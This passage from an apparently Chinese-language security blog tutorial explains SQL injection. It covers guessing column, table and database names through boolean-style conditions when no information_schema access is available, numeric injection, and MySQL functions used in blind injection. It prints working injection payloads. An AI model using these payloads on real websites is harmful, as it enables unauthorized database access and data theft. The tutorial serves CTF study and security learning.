<h3 id="6-无权限时，猜解列名，表名，库名"><a href="#6-无权限时，猜解列名，表名，库名" class="headerlink" title="6.无权限时，猜解列名，表名，库名"></a>6.无权限时，猜解列名，表名，库名</h3><p>  当前用户不是root用户，就无权访问information_schema库<br>  只能通过返回页面的两种状态判断是否猜解正确，其原理跟布尔型sql盲注一致<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and column is null --+    </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span><span class="string">' and column is null -- '</span></div></pre></td></tr></table></figure></p>
<p>用字典文件替换column，如果不存在此列，有错误；存在此列，无返回(类似来判断，下同)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and table.user is null --+	</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name='</span> and db.table.user is null --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=<span class="string">' and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div></pre></td></tr></table></figure></p>
<p>在猜解到你所要的库，表，列之后可以直接union select 查询</p>
<h2 id="数字型SQL注入"><a href="#数字型SQL注入" class="headerlink" title="数字型SQL注入"></a>数字型SQL注入</h2><p>数字型注入和字符型注入原理相同，但更为简单。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=1 and 1=1 <span class="comment">#</span></div></pre></td></tr></table></figure></p>
<p>区别：</p>
<ul>
<li>不用考虑 ’ 闭合问题</li>
<li>输入字符’a’时  把需要的字符串变为Ox16进制 </li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上就可以通过sql注入漏洞，查询到数据库的信息。<br>另外，还可以通过数据库进行—-&gt;sql文件操作<br>但是实际情况下：<br>服务器会过滤限制我们的输入，这就关系到—-&gt;sql过滤<br>服务器不显示查询信息和错误信息，需要—-&gt;<a href="https://lalajun.github.io/2017/09/24/WEB-CTF%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8/#more" target="_blank" rel="external">sql盲注</a></p>
<h2 id="数据库函数"><a href="#数据库函数" class="headerlink" title="数据库函数"></a>数据库函数</h2><ul>
<li>char（）—-&gt; ASCII码 变为 字符</li>
<li><a href="http://www.bubuko.com/infodetail-455153.html" target="_blank" rel="external">group_cat（) 和 group_concat</a> —–&gt; 用分隔符链接字符串；可以多个结果合并提高效率</li>
<li><a href="http://www.yiibai.com/sql/sql_function_substring_index.html" target="_blank" rel="external">substring_index()</a>  —–&gt; 分割字符串提取自己想要查看的</li>
<li><a href="http://www.w3school.com.cn/sql/sql_func_mid.asp" target="_blank" rel="external">mid(String,n,n)</a>——&gt;截取字符串</li>
<li><a href="https://www.lvtao.net/study_doc/mysql/mysql_function_oct_str.html" target="_blank" rel="external">ord()</a> ——-&gt;字符变为ASCII码， 一个字节字符直接变ASCII，多字节字符相连ASCII<br>ord() <strong>&amp;</strong> 128 或 64 或 32 或 16 或 8 ……1 来判断分割多个字符</li>
<li>and 前面语句<strong>出错</strong>后面语句不执行   </li>
<li>or  前面语句<strong>正确</strong>后面语句不执行</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
